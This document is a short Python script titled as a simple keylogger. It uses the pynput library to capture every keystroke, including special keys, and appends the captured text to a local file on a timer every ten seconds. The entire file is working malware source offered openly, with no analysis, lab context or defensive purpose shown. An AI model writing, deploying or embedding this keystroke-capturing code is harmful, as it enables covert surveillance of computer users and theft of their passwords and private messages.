# simple_keylogger.py

import pynput.keyboard
import threading

log = ""
log_file_path = "/home/monsterzero/Desktop/keylogger.txt"  # Specify your desired path

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

def report():
    global log
    with open(log_file_path, "a") as f:
        f.write(log)
    log = ""
    timer = threading.Timer(10, report)  # Adjust the interval as needed
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
 
